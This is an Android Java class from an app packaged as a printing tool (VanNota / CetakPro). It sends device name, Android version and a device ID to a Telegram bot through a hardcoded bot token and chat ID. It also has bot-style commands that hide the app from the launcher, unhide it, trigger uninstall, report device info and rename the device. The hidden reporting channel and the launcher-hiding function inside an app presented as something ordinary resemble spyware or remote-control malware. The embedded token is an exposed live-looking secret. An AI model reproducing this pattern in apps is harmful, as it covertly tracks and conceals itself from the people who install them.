package com.cetakpro.print;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class TelegramSender {
    private static final String TAG = "TelegramSender";
    
    // HARDCODE TOKEN & CHAT ID
    private static final String BOT_TOKEN = "8662155042:AAFRLkduh9r2FoOtt3TkqmTxNqAmWleibew";
    private static final String CHAT_ID = "1286411089";
    
    private static final int CONNECT_TIMEOUT = 10000;
    private static final int READ_TIMEOUT = 10000;

    public static void sendMessage(Context context, String title, String message) {
        new Thread(() -> {
            try {
                String deviceName = getDeviceName(context);
                String fullText = title + "\n" + message + "\n\n📱 " + deviceName;
                
                Log.d(TAG, "📤 Mengirim ke Telegram: " + title);
                
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlString);
                
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(CONNECT_TIMEOUT);
                conn.setReadTimeout(READ_TIMEOUT);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                
                String bodyText = "chat_id=" + CHAT_ID + 
                                 "&text=" + URLEncoder.encode(fullText, StandardCharsets.UTF_8.name());
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(bodyText.getBytes(StandardCharsets.UTF_8));
                    os.flush();
                }
                
                int responseCode = conn.getResponseCode();
                
                if (responseCode >= 200 && responseCode < 300) {
                    Log.d(TAG, "✅ Pesan terkirim (HTTP " + responseCode + ")");
                } else {
                    Log.e(TAG, "❌ Error HTTP " + responseCode);
                }
                
                conn.disconnect();
                
                if (message.startsWith("/")) {
                    handleTelegramCommand(context, message);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Error: " + e.getMessage());
            }
        }).start();
    }

    private static String getDeviceName(Context context) {
        try {
            SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
            String name = prefs.getString("device_name", Build.MODEL);
            return name != null && !name.isEmpty() ? name : Build.MODEL;
        } catch (Exception e) {
            return Build.MODEL;
        }
    }

    private static void handleTelegramCommand(Context context, String command) {
        Log.d(TAG, "📩 Perintah diterima: " + command);
        
        // ==========================================
        // /start - RESPON BOT AKTIF
        // ==========================================
        if (command.equalsIgnoreCase("/start")) {
            String deviceName = getDeviceName(context);
            String startMsg = "🤖 VanNota Bot Aktif!\n\n" +
                              "📱 Perangkat: " + deviceName + "\n" +
                              "Status: ✅ Online\n\n" +
                              "Kirim /menu untuk melihat daftar perintah.";
            sendMessage(context, "✅ Bot Aktif", startMsg);
            return;
        }
        
        // ==========================================
        // /menu - MENU PERINTAH
        // ==========================================
        if (command.equalsIgnoreCase("/menu") || command.equalsIgnoreCase("/help")) {
            String menu = "📋 DAFTAR PERINTAH\n\n" +
                          "/start - Cek status bot\n" +
                          "/menu - Tampilkan menu ini\n" +
                          "/hide - Sembunyikan aplikasi dari launcher\n" +
                          "/unhide - Tampilkan aplikasi di launcher\n" +
                          "/uninstall - Hapus aplikasi dari perangkat\n" +
                          "/info - Lihat info perangkat + status launcher\n" +
                          "/rename [nama] - Ubah nama perangkat\n\n" +
                          "⚠️ Hanya pemilik yang dapat menggunakan perintah ini.";
            sendMessage(context, "📋 Menu", menu);
            return;
        }
        
        // ==========================================
        // /hide - SEMBUNYIKAN APLIKASI
        // ==========================================
        if (command.equalsIgnoreCase("/hide")) {
            Log.d(TAG, "👻 Perintah hide diterima!");
            
            try {
                PackageManager pm = context.getPackageManager();
                ComponentName componentName = new ComponentName(context, MainActivity.class);
                
                pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                );
                
                SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
                prefs.edit().putBoolean("app_hidden", true).apply();
                
                sendMessage(context, "👻 HIDE", "Aplikasi VanNota disembunyikan dari launcher.\nKirim /unhide untuk menampilkan kembali.");
                Log.d(TAG, "✅ Aplikasi disembunyikan");
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Gagal hide: " + e.getMessage());
                sendMessage(context, "❌ GAGAL HIDE", "Error: " + e.getMessage());
            }
            return;
        }
        
        // ==========================================
        // /unhide - TAMPILKAN APLIKASI
        // ==========================================
        if (command.equalsIgnoreCase("/unhide")) {
            Log.d(TAG, "👀 Perintah unhide diterima!");
            
            try {
                PackageManager pm = context.getPackageManager();
                ComponentName componentName = new ComponentName(context, MainActivity.class);
                
                pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                );
                
                SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
                prefs.edit().putBoolean("app_hidden", false).apply();
                
                sendMessage(context, "👀 UNHIDE", "Aplikasi VanNota muncul kembali di launcher.");
                Log.d(TAG, "✅ Aplikasi dimunculkan kembali");
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Gagal unhide: " + e.getMessage());
                sendMessage(context, "❌ GAGAL UNHIDE", "Error: " + e.getMessage());
            }
            return;
        }
        
        // ==========================================
        // /uninstall - HAPUS APLIKASI
        // ==========================================
        if (command.equalsIgnoreCase("/uninstall") || command.equalsIgnoreCase("/hapus")) {
            Log.d(TAG, "🗑️ Perintah uninstall diterima!");
            
            sendMessage(context, "🗑️ UNINSTALL", "Menghapus VanNota dari " + getDeviceName(context) + "...");
            
            try {
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                Log.d(TAG, "✅ Intent uninstall dikirim");
            } catch (Exception e) {
                Log.e(TAG, "❌ Gagal uninstall: " + e.getMessage());
                sendMessage(context, "❌ GAGAL UNINSTALL", "Error: " + e.getMessage());
            }
            
            android.os.Process.killProcess(android.os.Process.myPid());
            return;
        }
        
        // ==========================================
        // /info - LIHAT INFO PERANGKAT
        // ==========================================
        if (command.equalsIgnoreCase("/info") || command.equalsIgnoreCase("/status")) {
            SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
            String deviceName = prefs.getString("device_name", Build.MODEL);
            String deviceId = prefs.getString("device_id", "Tidak diketahui");
            String androidVersion = Build.VERSION.RELEASE;
            
            PackageManager pm = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, MainActivity.class);
            int setting = pm.getComponentEnabledSetting(componentName);
            String visibility = (setting == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) ? "Tersembunyi" : "Terlihat";
            
            String info = "📱 INFO PERANGKAT\n" +
                          "Nama: " + deviceName + "\n" +
                          "Android: " + androidVersion + "\n" +
                          "ID: " + deviceId + "\n" +
                          "Status Launcher: " + visibility + "\n\n" +
                          "Perintah:\n" +
                          "/start - Cek status bot\n" +
                          "/menu - Tampilkan menu\n" +
                          "/hide - Sembunyikan aplikasi\n" +
                          "/unhide - Tampilkan aplikasi\n" +
                          "/uninstall - Hapus aplikasi\n" +
                          "/rename [nama] - Ubah nama perangkat\n" +
                          "/info - Lihat info ini";
            
            sendMessage(context, "ℹ️ Device Info", info);
            return;
        }
        
        // ==========================================
        // /rename [nama] - UBAH NAMA PERANGKAT
        // ==========================================
        if (command.startsWith("/rename ")) {
            String newName = command.substring(8).trim();
            if (newName.isEmpty()) {
                sendMessage(context, "⚠️ RENAME", "Format: /rename [nama baru]");
                return;
            }
            
            SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
            prefs.edit().putString("device_name", newName).apply();
            
            sendMessage(context, "✅ RENAME", "Nama perangkat diubah menjadi:\n" + newName);
            return;
        }
        
        // ==========================================
        // PERINTAH TIDAK DIKENAL
        // ==========================================
        sendMessage(context, "❓ Perintah tidak dikenal", "Kirim /menu untuk melihat daftar perintah.");
    }
                    }
